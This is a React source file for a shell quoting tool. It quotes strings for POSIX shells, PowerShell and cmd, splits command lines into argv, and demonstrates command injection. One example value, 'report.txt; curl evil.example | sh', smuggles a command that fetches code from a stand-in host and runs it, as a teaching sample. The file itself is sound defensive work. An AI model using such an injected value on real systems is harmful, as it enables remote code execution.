/**
 * Shell quoting tool.
 *
 * Two directions. Quote: one string becomes one argument for a POSIX shell,
 * bash's $'...', PowerShell and Windows cmd, with the reasons each form
 * looks the way it does. Split: a command line is cut into argv the way a
 * POSIX shell does it before anything runs, with expansions marked rather
 * than performed. A third panel puts the two together to show what
 * concatenating untrusted text into a command does. All of the logic lives
 * in lib/toolkit/shell-quote-tool and is tested against bash and dash.
 */

import { useMemo, useState, type ReactNode } from "react";
import { CopyButton } from "@/components/ui/copy-button";
import {
  MAX_INPUT,
  canonicalCommand,
  decodeTypedEscapes,
  fillTemplate,
  quoteAll,
  splitCommandLine,
  visibleParts,
  type CommandItem,
  type ParsedCommand,
  type QuoteIssue,
  type Redirect,
  type Segment,
  type SplitResult,
  type Word,
} from "@/lib/toolkit/shell-quote-tool";
import { ToolPanel, ToolShell } from "./ToolShell";

const LABEL_CLASS =
  "font-mono-tight text-[0.625rem] uppercase tracking-[0.32em] text-[hsl(var(--brand-ash))]";
const TEXTAREA_CLASS =
  "mt-3 w-full resize-y rounded-lg border border-[hsl(var(--brand-iron))] bg-[hsl(var(--brand-obsidian)/0.6)] px-4 py-3 font-mono-tight text-sm leading-relaxed text-[hsl(var(--brand-bone))] placeholder:text-[hsl(var(--brand-ash))] focus:border-[hsl(var(--brand-signal))] focus:outline-none";
const INPUT_CLASS =
  "mt-2 w-full rounded-lg border border-[hsl(var(--brand-iron))] bg-[hsl(var(--brand-obsidian)/0.6)] px-4 py-3 font-mono-tight text-sm text-[hsl(var(--brand-bone))] placeholder:text-[hsl(var(--brand-ash))] focus:border-[hsl(var(--brand-signal))] focus:outline-none";
const CHIP_CLASS =
  "inline-flex min-h-[36px] items-center rounded-full border border-[hsl(var(--brand-iron))] px-4 py-1 font-mono-tight text-[0.625rem] uppercase tracking-[0.18em] text-[hsl(var(--brand-ash))] transition-colors hover:border-[hsl(var(--brand-signal)/0.6)] hover:text-[hsl(var(--brand-bone))] focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-[hsl(var(--brand-signal))]";
const PRE_CLASS =
  "min-w-0 flex-1 overflow-x-auto whitespace-pre rounded-lg border border-[hsl(var(--brand-iron))] bg-[hsl(var(--brand-obsidian))] p-3 font-mono-tight text-xs leading-relaxed text-[hsl(var(--brand-signal))]";
const FOCUS =
  "focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-[hsl(var(--brand-signal))]";

function toggleClass(on: boolean): string {
  return on
    ? "border-[hsl(var(--brand-signal))] bg-[hsl(var(--brand-signal)/0.14)] text-[hsl(var(--brand-signal))]"
    : "border-[hsl(var(--brand-iron))] bg-[hsl(var(--brand-obsidian)/0.6)] text-[hsl(var(--brand-ash))] hover:text-[hsl(var(--brand-bone))]";
}

const ISSUE_CLASS: Record<QuoteIssue["level"], string> = {
  danger:
    "border-[hsl(var(--brand-danger)/0.5)] bg-[hsl(var(--brand-danger)/0.08)] text-[hsl(var(--brand-danger))]",
  warn: "border-[hsl(var(--brand-amber)/0.5)] bg-[hsl(var(--brand-amber)/0.08)] text-[hsl(var(--brand-amber))]",
  info: "border-[hsl(var(--brand-iron))] bg-[hsl(var(--brand-obsidian)/0.4)] text-[hsl(var(--brand-bone-dim))]",
};

const QUOTE_EXAMPLES: { label: string; value: string; escapes?: boolean }[] = [
  { label: "Apostrophe", value: "it's Max's file.txt" },
  { label: "Injection", value: "report.txt; curl evil.example | sh" },
  { label: "Expansions", value: "$HOME and `whoami` and $(id)" },
  { label: "Control chars", value: "red \\e[31mtext\\e[0m\\tand a tab", escapes: true },
  { label: "Leading dash", value: "-rf" },
  { label: "Curly quote", value: "don\u2019t" },
  { label: "Windows path", value: 'C:\\Program Files\\App\\ "quoted" & 50%' },
];

const SPLIT_EXAMPLES: { label: string; value: string }[] = [
  { label: "Quotes", value: `printf '%s\\n' "it's" 'say "hi"' a\\ b ""` },
  { label: "Pipeline", value: `grep -rn "TODO" src 2>/dev/null | sort | uniq -c > todo.txt && echo done` },
  { label: "Variables", value: `echo "$HOME" $USER \${PATH%%:*} $(date +%F) "$@"` },
  { label: "Globs", value: `rm -f -- *.log ~/tmp/[0-9]* backup.{tar,gz}` },
  { label: "Env and if", value: `if LC_ALL=C grep -q "^root:" /etc/passwd; then echo found; fi` },
  { label: "Here-doc", value: `cat <<'EOF' > settings.ini\n[core]\nuser = $USER\nEOF` },
  { label: "ANSI-C", value: `printf '[%s]\\n' $'tab\\there' $'it\\'s'` },
];

/* ----------------------------------------------------------- rendering */

function Visible({ text, spaces = true }: { text: string; spaces?: boolean }) {
  return (
    <>
      {visibleParts(text, spaces).map((p, i) =>
        p.escape ? (
          <span key={i} className="text-[hsl(var(--brand-ash))]">
            {p.text}
          </span>
        ) : (
          <span key={i}>{p.text}</span>
        ),
      )}
    </>
  );
}

const SEG_CLASS: Partial<Record<Segment["kind"], string>> = {
  param: "rounded-sm border border-dashed border-[hsl(var(--brand-cyan)/0.6)] px-0.5 text-[hsl(var(--brand-cyan))]",
  command: "rounded-sm border border-dashed border-[hsl(var(--brand-cyan)/0.6)] px-0.5 text-[hsl(var(--brand-cyan))]",
  arith: "rounded-sm border border-dashed border-[hsl(var(--brand-cyan)/0.6)] px-0.5 text-[hsl(var(--brand-cyan))]",
  procsub: "rounded-sm border border-dashed border-[hsl(var(--brand-cyan)/0.6)] px-0.5 text-[hsl(var(--brand-cyan))]",
  glob: "text-[hsl(var(--brand-amber))]",
  tilde: "text-[hsl(var(--brand-amber))]",
  brace: "text-[hsl(var(--brand-amber))]",
};

function WordValue({ word }: { word: Word }) {
  if (word.value === "" && word.segments.every((s) => !SEG_CLASS[s.kind])) {
    return <span className="text-[hsl(var(--brand-ash))]">(empty string)</span>;
  }
  return (
    <>
      {word.segments.map((s, i) => {
        const cls = SEG_CLASS[s.kind];
        return cls ? (
          <span key={i} className={cls}>
            {s.value}
          </span>
        ) : (
          <span key={i}>
            <Visible text={s.value} />
          </span>
        );
      })}
    </>
  );
}

function wordTags(word: Word, simple: boolean): string[] {
  const tags: string[] = [];
  if (!simple) return tags;
  if (word.atExpansion) tags.push("one argument per item");
  else if (word.splits) tags.push("expands, then splits and globs");
  else if (word.expansions.length) tags.push("expands to one argument");
  if (word.glob) tags.push("glob: matching names");
  if (word.tilde) tags.push("tilde: home directory");
  if (word.brace) tags.push("brace expansion");
  if (word.procsub) tags.push("becomes a /dev/fd path");
  if (word.quoted && !word.expansions.length) tags.push("quoted");
  if (word.truncatedAtNul) tags.push("cut at \\0");
  return tags;
}

function Box({ label, children, tags = [], tone = "arg" }: { label: string; children: ReactNode; tags?: string[]; tone?: "arg" | "assign" | "keyword" | "redirect" }) {
  const border =
    tone === "arg"
      ? "border-[hsl(var(--brand-signal)/0.5)]"
      : tone === "assign"
        ? "border-[hsl(var(--brand-amber)/0.5)]"
        : tone === "redirect"
          ? "border-[hsl(var(--brand-cyan)/0.5)]"
          : "border-[hsl(var(--brand-iron))]";
  return (
    <div className={`flex min-w-0 max-w-full flex-col rounded-lg border bg-[hsl(var(--brand-obsidian)/0.5)] px-3 py-2 ${border}`}>
      <span className="font-mono-tight text-[0.625rem] uppercase tracking-[0.18em] text-[hsl(var(--brand-ash))]">{label}</span>
      <span className="mt-1 whitespace-pre-wrap break-all font-mono-tight text-sm text-[hsl(var(--brand-bone))]">{children}</span>
      {tags.length ? (
        <span className="mt-1.5 flex flex-wrap gap-1">
          {tags.map((tg) => (
            <span
              key={tg}
              className="rounded-sm bg-[hsl(var(--brand-carbon))] px-1.5 py-0.5 font-mono-tight text-[0.625rem] text-[hsl(var(--brand-bone-dim))]"
            >
              {tg}
            </span>
          ))}
        </span>
      ) : null}
    </div>
  );
}

const REDIRECT_TEXT: Record<string, string> = {
  "<": "reads standard input from",
  ">": "writes standard output to, truncating",
  ">>": "appends standard output to",
  ">|": "writes, even with noclobber set, to",
  "<>": "opens for reading and writing",
  "<&": "duplicates input from descriptor",
  ">&": "duplicates output onto",
  "<<": "here-document ended by",
  "<<-": "here-document, leading tabs removed, ended by",
  "<<<": "here-string (bash)",
  "&>": "writes standard output and standard error to (bash)",
  "&>>": "appends standard output and standard error to (bash)",
};

function fdName(fd: string | null, op: string): string {
  const n = fd ?? (op.startsWith("<") ? "0" : op.startsWith("&") ? "" : "1");
  if (n === "") return "";
  const names: Record<string, string> = { "0": "stdin", "1": "stdout", "2": "stderr" };
  return names[n] ? `fd ${n} (${names[n]})` : `fd ${n}`;
}

function RedirectBox({ r }: { r: Redirect }) {
  const fdText = fdName(r.fd, r.op);
  return (
    <div className="min-w-0 max-w-full">
      <Box label={`redirect ${r.fd ?? ""}${r.op}`} tone="redirect">
        {r.target ? <WordValue word={r.target} /> : "?"}
        <span className="mt-1 block font-mono-tight text-[0.6875rem] text-[hsl(var(--brand-bone-dim))]">
          {fdText ? `${fdText}: ` : ""}
          {REDIRECT_TEXT[r.op] ?? "redirection"}
        </span>
      </Box>
      {r.heredoc ? (
        <div className="mt-2">
          <div className={LABEL_CLASS}>
            Here-document body, {r.heredoc.expands ? "with $ and ` expanded" : "literal because the delimiter is quoted"}
          </div>
          <pre className={`${PRE_CLASS} mt-1 block text-[hsl(var(--brand-bone))]`}>{r.heredoc.body || " "}</pre>
        </div>
      ) : null}
    </div>
  );
}

const TERMINATOR_TEXT: Record<string, string> = {
  "|": "Pipe: its standard output becomes the next command's standard input.",
  "|&": "Pipe of standard output and standard error (bash).",
  "&&": "The next command runs only if this one exits 0.",
  "||": "The next command runs only if this one fails.",
  ";": "The next command runs after this one, whatever its exit status.",
  "\n": "End of line: the next command runs after this one.",
  "&": "Runs in the background; the shell moves on without waiting.",
  ";;": "Ends a case branch.",
  ";&": "Ends a case branch and falls through to the next (bash).",
  ";;&": "Ends a case branch and tests the next pattern (bash).",
  "(": "Starts a subshell.",
  ")": "Ends a subshell or a case pattern.",
};

function CommandView({ cmd, n, compact = false }: { cmd: ParsedCommand; n: number; compact?: boolean }) {
  const simple = cmd.kind === "simple";
  const kindNote =
    cmd.kind === "header"
      ? "A for, case, select or function header. Its words are not a command's argv."
      : cmd.kind === "conditional"
        ? "A [[ ]] test (bash). Words inside are not split or globbed, and && || < > are test operators."
        : cmd.kind === "arithmetic"
          ? "A (( )) arithmetic command (bash). Its contents are an expression, not arguments."
          : null;
  return (
    <div className="min-w-0 rounded-xl border border-[hsl(var(--brand-iron))] bg-[hsl(var(--brand-obsidian)/0.3)] p-4">
      <div className="flex flex-wrap items-baseline justify-between gap-2">
        <span className={LABEL_CLASS}>Command {n}</span>
        {simple && cmd.argv.length ? (
          <span className="font-mono-tight text-xs text-[hsl(var(--brand-ash))]">
            argc {cmd.argv.length}
          </span>
        ) : null}
      </div>
      <div className="mt-3 flex flex-wrap gap-2">
        {cmd.items.map((it: CommandItem, i) => {
          if (it.role === "redirect" && it.redirect) return <RedirectBox key={i} r={it.redirect} />;
          if (it.role === "keyword") {
            return (
              <Box key={i} label="keyword" tone="keyword">
                {it.word ? it.word.value : it.op}
              </Box>
            );
          }
          if (it.role === "assign" && it.word) {
            return (
              <Box key={i} label="environment" tone="assign">
                <WordValue word={it.word} />
              </Box>
            );
          }
          if (!it.word) return null;
          return (
            <Box key={i} label={simple && it.index !== undefined ? `argv[${it.index}]` : "word"} tags={compact ? [] : wordTags(it.word, simple)}>
              <WordValue word={it.word} />
            </Box>
          );
        })}
      </div>
      {kindNote && !compact ? (
        <p className="mt-3 font-mono-tight text-xs leading-relaxed text-[hsl(var(--brand-bone-dim))]">{kindNote}</p>
      ) : null}
      {simple && cmd.argv.length === 0 && cmd.items.some((x) => x.role === "assign") && !compact ? (
        <p className="mt-3 font-mono-tight text-xs leading-relaxed text-[hsl(var(--brand-bone-dim))]">
          Only assignments and no command: these set shell variables in the current shell instead of passing an
          environment to a program.
        </p>
      ) : null}
      {cmd.terminator && TERMINATOR_TEXT[cmd.terminator] && !compact ? (
        <p className="mt-3 font-mono-tight text-xs leading-relaxed text-[hsl(var(--brand-ash))]">
          <span className="text-[hsl(var(--brand-bone))]">{cmd.terminator === "\n" ? "newline" : cmd.terminator}</span>{" "}
          {TERMINATOR_TEXT[cmd.terminator]}
        </p>
      ) : null}
    </div>
  );
}

function SplitError({ result }: { result: SplitResult }) {
  if (result.ok) return null;
  return (
    <div role="alert" data-testid="text-split-error" className={`rounded-lg border p-4 ${ISSUE_CLASS.danger}`}>
      <p className="font-mono-tight text-xs leading-relaxed">{result.message}</p>
      {result.lineText !== undefined && result.column !== undefined ? (
        <pre className="mt-3 overflow-x-auto whitespace-pre font-mono-tight text-xs leading-relaxed text-[hsl(var(--brand-bone))]">
          {`line ${result.line}: ${result.lineText}\n${" ".repeat(`line ${result.line}: `.length + result.column - 1)}^`}
        </pre>
      ) : null}
    </div>
  );
}

function CopyRow({ label, detail, value, testId }: { label: string; detail: ReactNode; value: string | null; testId: string }) {
  return (
    <div className="border-b border-[hsl(var(--brand-iron)/0.5)] py-4 first:pt-0 last:border-b-0 last:pb-0">
      <div className={LABEL_CLASS}>{label}</div>
      {value !== null ? (
        <div className="mt-2 flex flex-wrap items-center gap-2">
          <pre className={PRE_CLASS} data-testid={testId}>
            {value}
          </pre>
          <CopyButton value={value} label={`Copy ${label}`} testId={`button-copy-${testId}`} />
        </div>
      ) : (
        <p className="mt-2 font-mono-tight text-xs text-[hsl(var(--brand-danger))]" data-testid={testId}>
          Cannot be represented here.
        </p>
      )}
      <p className="mt-2 font-mono-tight text-xs leading-relaxed text-[hsl(var(--brand-bone-dim))]">{detail}</p>
    </div>
  );
}

/* ---------------------------------------------------------- the panels */

function QuotePanel() {
  const [raw, setRaw] = useState("it's Max's file.txt");
  const [escapes, setEscapes] = useState(false);
  const [template, setTemplate] = useState("grep {} /var/log/app.log");

  const tooLong = raw.length > MAX_INPUT;
  const decoded = useMemo(() => (escapes ? decodeTypedEscapes(raw) : { value: raw, error: null }), [raw, escapes]);
  const report = useMemo(() => (tooLong ? null : quoteAll(decoded.value)), [decoded.value, tooLong]);

  const unsafeLine = fillTemplate(template, decoded.value);
  const safeLine = fillTemplate(template, report ? report.posix : "");
  const unsafe = useMemo(() => splitCommandLine(unsafeLine), [unsafeLine]);
  const safe = useMemo(() => splitCommandLine(safeLine), [safeLine]);
  const safeArgs = safe.ok ? safe.commands.reduce((a, c) => a + c.argv.length, 0) : 0;
  const unsafeDiffers =
    !unsafe.ok ||
    !safe.ok ||
    unsafe.commands.length !== safe.commands.length ||
    unsafe.commands.reduce((a, c) => a + c.items.length, 0) !== safe.commands.reduce((a, c) => a + c.items.length, 0) ||
    unsafe.dynamic !== safe.dynamic ||
    JSON.stringify(unsafe.commands.map((c) => c.argv.map((w) => w.value))) !==
      JSON.stringify(safe.commands.map((c) => c.argv.map((w) => w.value)));

  return (
    <div className="space-y-6">
      <ToolPanel title="String">
        <label htmlFor="quote-input" className="block font-mono-tight text-sm text-[hsl(var(--brand-bone-dim))]">
          The exact text one argument should carry
        </label>
        <textarea
          id="quote-input"
          value={raw}
          onChange={(event) => setRaw(event.target.value)}
          rows={3}
          spellCheck={false}
          autoComplete="off"
          autoCapitalize="off"
          autoCorrect="off"
          aria-invalid={decoded.error !== null || tooLong}
          aria-describedby="quote-input-hint"
          data-testid="input-quote"
          className={TEXTAREA_CLASS}
        />
        <label className="mt-2 flex min-h-[44px] items-center gap-3 font-mono-tight text-sm text-[hsl(var(--brand-bone))]">
          <input
            type="checkbox"
            checked={escapes}
            onChange={(event) => setEscapes(event.target.checked)}
            data-testid="checkbox-escapes"
            className="h-5 w-5 shrink-0 accent-[hsl(var(--brand-signal))]"
          />
          <span className="min-w-0">
            Read \n, \t, \e, \0, \xHH and \u{"{...}"} in what I type
          </span>
        </label>
        {decoded.error || tooLong ? (
          <p id="quote-input-hint" role="alert" className="mt-2 font-mono-tight text-xs leading-relaxed text-[hsl(var(--brand-danger))]">
            {tooLong ? `The string is ${raw.length.toLocaleString("en-US")} characters; this quotes at most ${MAX_INPUT.toLocaleString("en-US")}.` : decoded.error}
          </p>
        ) : (
          <p id="quote-input-hint" className="mt-2 font-mono-tight text-xs leading-relaxed text-[hsl(var(--brand-ash))]">
            {decoded.value.length.toLocaleString("en-US")} characters. Newlines typed here are part of the string.
          </p>
        )}
        <div className="mt-4 flex flex-wrap items-center gap-2">
          <span className="font-mono-tight text-[0.625rem] uppercase tracking-[0.24em] text-[hsl(var(--brand-ash))]">Try</span>
          {QUOTE_EXAMPLES.map((ex) => (
            <button
              key={ex.label}
              type="button"
              onClick={() => {
                setRaw(ex.value);
                setEscapes(Boolean(ex.escapes));
              }}
              data-testid={`button-quote-example-${ex.label.toLowerCase().replace(/[^a-z0-9]+/g, "-")}`}
              className={CHIP_CLASS}
            >
              {ex.label}
            </button>
          ))}
        </div>
      </ToolPanel>

      {report && !decoded.error ? (
        <div className="space-y-6" data-testid="output-quote">
          {report.issues.length ? (
            <div className="space-y-2" data-testid="list-quote-issues">
              {report.issues.map((issue) => (
                <p key={issue.text} className={`break-words rounded-lg border p-3 font-mono-tight text-xs leading-relaxed ${ISSUE_CLASS[issue.level]}`}>
                  {issue.text}
                </p>
              ))}
            </div>
          ) : null}

          <div className="grid grid-cols-1 gap-6 lg:grid-cols-2">
            <ToolPanel title="Unix shells">
              <CopyRow
                label="POSIX sh, bash, zsh"
                value={report.posix}
                testId="text-posix"
                detail={
                  <>
                    Inside single quotes every character is literal, newlines included, so only a single quote needs
                    handling: close the quote, add an escaped quote, reopen. That is the {"'\\''"} you see.
                    {report.needsQuoting ? null : (
                      <>
                        {" "}
                        This string has no special characters, so <code className="text-[hsl(var(--brand-cyan))]">{report.posixMinimal}</code>{" "}
                        works bare too.
                      </>
                    )}
                  </>
                }
              />
              <CopyRow
                label="bash $'...'"
                value={report.ansiC}
                testId="text-ansi-c"
                detail={
                  <>
                    ANSI-C quoting: backslash escapes such as \n, \t and \xHH spell out characters you cannot see.
                    bash, zsh, ksh93 and mksh support it, and POSIX added it in 2024, but an older /bin/sh prints the
                    $ literally.
                    {report.controlCount + report.invisibleCount === 0 ? " With nothing invisible here, it matches the single-quoted form." : ""}
                  </>
                }
              />
            </ToolPanel>

            <ToolPanel title="Windows">
              <CopyRow
                label="PowerShell"
                value={report.powershell}
                testId="text-powershell"
                detail={"A verbatim string: nothing inside expands, and a single quote is written twice. PowerShell also reads the curly quotes \u2018 \u2019 \u201a \u201b as single quotes, so those are doubled as well."}
              />
              {report.powershellEscaped ? (
                <CopyRow
                  label="PowerShell 7, escaped"
                  value={report.powershellEscaped}
                  testId="text-powershell-escaped"
                  detail="An expandable string with backtick escapes for the control characters. `e and `u{...} need PowerShell 6 or later. $ and backtick are escaped so nothing expands."
                />
              ) : null}
              <CopyRow
                label="Program argv (C runtime rules)"
                value={report.msvc}
                testId="text-msvc"
                detail={'Windows passes one command line string, and each program splits it. Most use the Microsoft C runtime rules: double quotes group, \\" is a literal quote, and backslashes double only before a quote. This is the string to give CreateProcess.'}
              />
              <CopyRow
                label="cmd.exe prompt"
                value={report.cmdPrompt}
                testId="text-cmd"
                detail="cmd.exe has no quoting that works for every string. It reads % and ! and toggles its own quote state at every double quote, backslash or not. So every metacharacter, quotes included, gets a caret, cmd removes the carets, and the program receives the C runtime form above. Assumes delayed expansion is off."
              />
              <CopyRow
                label="Batch file line"
                value={report.cmdBatch}
                testId="text-batch"
                detail="The same, except that in a .bat or .cmd file a percent sign is doubled instead of escaped with a caret. Calling a batch file with untrusted arguments is unsafe whatever you do: cmd re-parses %1, and there is no quoting that survives that."
              />
            </ToolPanel>
          </div>

          <ToolPanel title="Concatenation versus quoting">
            <label htmlFor="quote-template" className={LABEL_CLASS}>
              Command template, {"{}"} marks where the string goes
            </label>
            <input
              id="quote-template"
              type="text"
              value={template}
              onChange={(event) => setTemplate(event.target.value)}
              spellCheck={false}
              autoComplete="off"
              autoCapitalize="off"
              autoCorrect="off"
              data-testid="input-template"
              className={INPUT_CLASS}
            />
            <div className="mt-5 grid grid-cols-1 gap-6 lg:grid-cols-2">
              <div className="min-w-0">
                <div className={LABEL_CLASS}>Pasted in as is</div>
                <pre className={`${PRE_CLASS} mt-2 block`}>{unsafeLine}</pre>
                <div className="mt-3 space-y-3" data-testid="output-unsafe">
                  {unsafe.ok ? (
                    unsafe.commands.map((c, i) => <CommandView key={i} cmd={c} n={i + 1} compact />)
                  ) : (
                    <SplitError result={unsafe} />
                  )}
                </div>
              </div>
              <div className="min-w-0">
                <div className={LABEL_CLASS}>Quoted with single quotes</div>
                <pre className={`${PRE_CLASS} mt-2 block`}>{safeLine}</pre>
                <div className="mt-3 space-y-3" data-testid="output-safe">
                  {safe.ok ? safe.commands.map((c, i) => <CommandView key={i} cmd={c} n={i + 1} compact />) : <SplitError result={safe} />}
                </div>
              </div>
            </div>
            <p
              className={`mt-5 break-words rounded-lg border p-3 font-mono-tight text-xs leading-relaxed ${unsafeDiffers ? ISSUE_CLASS.danger : ISSUE_CLASS.info}`}
              data-testid="text-injection-verdict"
            >
              {unsafeDiffers
                ? `Pasted in as is, the shell reads this string as syntax: ${
                    !unsafe.ok
                      ? "it does not even parse"
                      : unsafe.commands.length > 1
                        ? `${unsafe.commands.length} commands instead of ${safe.ok ? safe.commands.length : 1}`
                        : unsafe.dynamic && !(safe.ok && safe.dynamic)
                          ? "parts of it would be expanded at run time"
                          : "the arguments come out different"
                  }. Quoted, it is ${safeArgs === 1 ? "one argument" : "exactly the intended arguments"}. Whoever controls the string controls the command.`
                : "For this string, concatenation and quoting happen to give the same argv. Change one character, a space, a quote or a semicolon, and that stops being true, which is why the quoting has to be unconditional."}
            </p>
          </ToolPanel>
        </div>
      ) : null}
    </div>
  );
}

function SplitPanel() {
  const [raw, setRaw] = useState(SPLIT_EXAMPLES[0].value);
  const result = useMemo(() => splitCommandLine(raw), [raw]);
  const ok = result.ok ? result : null;
  const simpleCmds = ok ? ok.commands.filter((c) => c.kind === "simple" && c.argv.length) : [];
  const json = ok ? JSON.stringify(simpleCmds.length === 1 ? simpleCmds[0].argv.map((w) => w.value) : simpleCmds.map((c) => c.argv.map((w) => w.value))) : "";
  const canonical = ok && !ok.dynamic ? simpleCmds.map((c) => canonicalCommand(c.argv)).join("\n") : "";

  return (
    <div className="space-y-6">
      <ToolPanel title="Command line">
        <label htmlFor="split-input" className="block font-mono-tight text-sm text-[hsl(var(--brand-bone-dim))]">
          A command as you would type it into a POSIX shell
        </label>
        <textarea
          id="split-input"
          value={raw}
          onChange={(event) => setRaw(event.target.value)}
          rows={4}
          spellCheck={false}
          autoComplete="off"
          autoCapitalize="off"
          autoCorrect="off"
          aria-invalid={!result.ok}
          aria-describedby="split-input-hint"
          data-testid="input-split"
          className={TEXTAREA_CLASS}
        />
        <p id="split-input-hint" className="mt-2 font-mono-tight text-xs leading-relaxed text-[hsl(var(--brand-ash))]">
          Split by the POSIX token rules. Variables, command substitutions, globs and tildes are marked, not
          expanded, because that needs your environment and files. Up to {MAX_INPUT.toLocaleString("en-US")}{" "}
          characters.
        </p>
        <div className="mt-4 flex flex-wrap items-center gap-2">
          <span className="font-mono-tight text-[0.625rem] uppercase tracking-[0.24em] text-[hsl(var(--brand-ash))]">Try</span>
          {SPLIT_EXAMPLES.map((ex) => (
            <button
              key={ex.label}
              type="button"
              onClick={() => setRaw(ex.value)}
              data-testid={`button-split-example-${ex.label.toLowerCase().replace(/[^a-z0-9]+/g, "-")}`}
              className={CHIP_CLASS}
            >
              {ex.label}
            </button>
          ))}
        </div>
      </ToolPanel>

      <div className="space-y-6" data-testid="output-split">
        <SplitError result={result} />
        {ok ? (
          <>
            <ToolPanel title={ok.commands.length === 1 ? "1 command" : `${ok.commands.length} commands`}>
              {ok.commands.length === 0 ? (
                <p className="font-mono-tight text-sm text-[hsl(var(--brand-bone-dim))]">Nothing to run: empty, or only comments.</p>
              ) : (
                <div className="space-y-3">
                  {ok.commands.slice(0, 200).map((c, i) => (
                    <CommandView key={i} cmd={c} n={i + 1} />
                  ))}
                  {ok.commands.length > 200 ? (
                    <p className="font-mono-tight text-xs text-[hsl(var(--brand-ash))]">The first 200 commands are shown.</p>
                  ) : null}
                </div>
              )}
              <div className="mt-5 flex flex-wrap gap-x-5 gap-y-2 font-mono-tight text-xs text-[hsl(var(--brand-ash))]" aria-label="Legend">
                <span>
                  <span className="text-[hsl(var(--brand-ash))]">{"\u00b7"}</span> a space inside an argument
                </span>
                <span>
                  <span className="rounded-sm border border-dashed border-[hsl(var(--brand-cyan)/0.6)] px-0.5 text-[hsl(var(--brand-cyan))]">$x</span>{" "}
                  expansion, left unexpanded
                </span>
                <span>
                  <span className="text-[hsl(var(--brand-amber))]">*</span> glob, tilde or brace
                </span>
              </div>
            </ToolPanel>

            {ok.warnings.length || ok.comments.length ? (
              <ToolPanel title="Notes">
                <ul className="space-y-2" data-testid="list-split-warnings">
                  {ok.warnings.map((w) => (
                    <li key={w} className="font-mono-tight text-xs leading-relaxed text-[hsl(var(--brand-bone-dim))]">
                      {w}
                    </li>
                  ))}
                  {ok.comments.map((c, i) => (
                    <li key={`c${i}`} className="break-all font-mono-tight text-xs leading-relaxed text-[hsl(var(--brand-bone-dim))]">
                      Comment, ignored by the shell: <span className="text-[hsl(var(--brand-bone))]">{c}</span>
                    </li>
                  ))}
                </ul>
              </ToolPanel>
            ) : null}

            {simpleCmds.length ? (
              <ToolPanel title="Copy">
                <div className="space-y-4">
                  <CopyRow
                    label="argv as JSON"
                    value={json}
                    testId="text-argv-json"
                    detail={
                      ok.dynamic
                        ? "Expansions appear as written, because this page does not run them. The real values depend on the shell's environment and files."
                        : "The exact strings each program receives, ready for an exec-style API that takes a list."
                    }
                  />
                  {canonical ? (
                    <CopyRow
                      label="Requoted"
                      value={canonical}
                      testId="text-canonical"
                      detail="The same argv written back with single quotes only where needed. It splits to exactly the arguments above."
                    />
                  ) : null}
                </div>
              </ToolPanel>
            ) : null}
          </>
        ) : null}
      </div>
    </div>
  );
}

export function ShellQuoteTool() {
  const [mode, setMode] = useState<"quote" | "split">("quote");
  return (
    <ToolShell slug="shell-quote-tool">
      <div className="space-y-6">
        <div role="group" aria-label="Direction" className="grid grid-cols-1 gap-2 sm:grid-cols-2">
          {[
            { key: "quote" as const, label: "Quote a string", sub: "text to one safe argument" },
            { key: "split" as const, label: "Split a command", sub: "command line to argv" },
          ].map((opt) => (
            <button
              key={opt.key}
              type="button"
              onClick={() => setMode(opt.key)}
              aria-pressed={mode === opt.key}
              data-testid={`button-mode-${opt.key}`}
              className={`flex min-h-[56px] flex-col items-start justify-center rounded-xl border px-4 py-2 text-left transition-colors ${FOCUS} ${toggleClass(mode === opt.key)}`}
            >
              <span className="font-mono-tight text-[0.6875rem] uppercase tracking-[0.24em]">{opt.label}</span>
              <span className="mt-0.5 font-mono-tight text-xs text-[hsl(var(--brand-bone-dim))]">{opt.sub}</span>
            </button>
          ))}
        </div>
        {mode === "quote" ? <QuotePanel /> : <SplitPanel />}
      </div>
    </ToolShell>
  );
}
